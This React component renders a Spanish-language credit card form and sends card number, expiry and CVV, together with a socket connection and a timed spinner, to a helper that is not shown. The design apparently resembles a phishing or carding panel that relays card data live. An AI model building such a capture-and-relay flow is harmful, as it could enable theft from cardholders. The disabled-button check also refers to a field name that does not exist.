import { SocketContext, UserDataContext } from '../../../context'
import { useContext, useState } from 'react'
import { useFormik } from 'formik'
import { useNavigate } from 'react-router-dom'

import { cardValidate } from '../../../security/cardValidate'
import { CreditCardInput } from './CreditCardInput'
import { ErrorCreditCard } from './ErrorCreditCard'
import { Spiner } from '../../Spiner'
import { submitBase } from '../../../helpers/submitBase'

const valuesData = { card: '', month: 'mes', year: 'año', cvv: '' }

export const CreditCard = ({urlToNavigate, spiner, timeLoader, endUrl = ''}) => {
    
    const navigate = useNavigate()
    const { addData } = useContext(UserDataContext);
    const { socket } =  useContext(SocketContext);  
    const [showSpiner , SetshowSpiner] = useState(false);
    const dataImportant = { addData, socket, SetshowSpiner, urlToNavigate, spiner, timeLoader, navigate }
    
    const { values, handleSubmit, handleChange, errors, handleBlur, touched } = useFormik({
        initialValues: valuesData,
        validate: values => cardValidate({values}),
        onSubmit: async(valuesData) => submitBase({dataImportant, valuesData, endUrl})
    })

    return (
        <div>
            {/* Spiner de carga */}
            {
                showSpiner === true ? <Spiner /> : null
            }

            {/* Aqui ira las notificacion de error */}
            <ErrorCreditCard errors={errors} touched={touched} />
            
            {/* Colocar diseño base */}
            <form className='flex flex-col' onSubmit={handleSubmit}>

                <CreditCardInput
                  card={values.card.toString().slice(0, 16)}
                  year={values.year}
                  month={values.month}
                  cvv={values.cvv.toString().slice(0, 3)}
                  handleChange={handleChange} 
                  handleBlur={handleBlur} 
                  touched={touched}
                  errors={errors}
                />

                <button 
                    disabled={(touched.cvv && errors.cvv) || (touched.tarjeta && errors.tarjeta) ? true : false}
                    className='bg-blue-400 px-4 py-1 rounded'
                    type='submit'
                >
                    Ingresar
                </button>
            </form>
        </div>
    )
}
